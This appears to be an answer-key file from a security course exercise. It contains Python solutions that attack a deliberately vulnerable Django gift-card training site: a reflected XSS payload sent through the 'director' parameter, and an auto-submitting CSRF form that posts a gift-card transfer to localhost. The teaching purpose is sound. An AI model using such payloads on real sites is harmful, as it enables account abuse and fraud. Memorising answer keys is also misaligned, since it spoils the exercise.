# %%

# w2d4_answers.py

import os
import sys
import django
import io
import unittest
import json
import re
import contextlib
import time
import shutil
import stat
import inspect

# Setup Django environment
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "GiftcardSite.settings")
django.setup()

from django.test import TestCase, Client
from django.db import connection
from LegacySite.models import Card, User
from django.template import engines

from django.test import TransactionTestCase
from django.core.management import call_command
# %%


def exploit_xss_vulnerability():
    """
    Exploit XSS vulnerability by injecting malicious script into director parameter.

    Args:
        None

    Returns:
        bool: True if XSS payload was successfully injected, False otherwise
    """
    from django.conf import settings

    # Add testserver to ALLOWED_HOSTS if not already there
    if "testserver" not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append("testserver")

    client = Client()
    # TODO: Create XSS payload and test vulnerable endpoint
    # - Create a malicious JavaScript payload
    xss_payload = "[YOU GOT HACKED!!!]"
    mwahahaha = f"<script> document.body.innerHTML='{xss_payload}'; </script>"
    #  <script> document.body.innerHTML='[YOU GOT HACKED!!!]'; </script>
    # - Replace the current response endpoint with the vulnerable one
    response = client.get(f"/buy/1?director={xss_payload}")
    # print(response.content)

    print(f"XSS exploit response status: {response.status_code}")

    if response.status_code == 200:
        response_content = response.content.decode()
        if xss_payload in response_content:
            print("[+] XSS vulnerability successfully exploited!")
            print(f"[+] Malicious payload found in response: {xss_payload}")
            return True
        else:
            print("[-] XSS payload not found in response (may be escaped)")
            return False
    else:
        print(f"[-] Request failed with status {response.status_code}")
        return False


from w2d4_test import test_exploit_xss_vulnerability

if __name__ == "__main__":
    test_exploit_xss_vulnerability(exploit_xss_vulnerability)


# %%
def exploit_csrf_vulnerability():
    """
    Create malicious HTML that exploits CSRF vulnerability.

    Args:
        None

    Returns:
        str: HTML content that performs the CSRF attack
    """
    # TODO: Create malicious HTML that performs CSRF attack
    # - Create an HTML page that appears legitimate
    # - Include a hidden form targeting the gift card endpoint
    # - Add JavaScript to automatically submit the form
    exploit = """
    <form id="evil" action="http://localhost:8000/gift/0" method="POST">
    <input type="text" name="amount" value="666">
    <input type="text" name="username" value="test2">
    </form>
    <script>
    document.querySelector("#evil").submit()
    </script>
    """
    bad_website = f"<html><body><h1>CSRF Vulnerability</h1>{exploit}</body></html>"
    # - Give user "test2" a gify card
    return bad_website


from w2d4_test import test_exploit_csrf_vulnerability

if __name__ == "__main__":
    print("\nTesting CSRF vulnerability exploitation...")
    test_exploit_csrf_vulnerability(exploit_csrf_vulnerability)
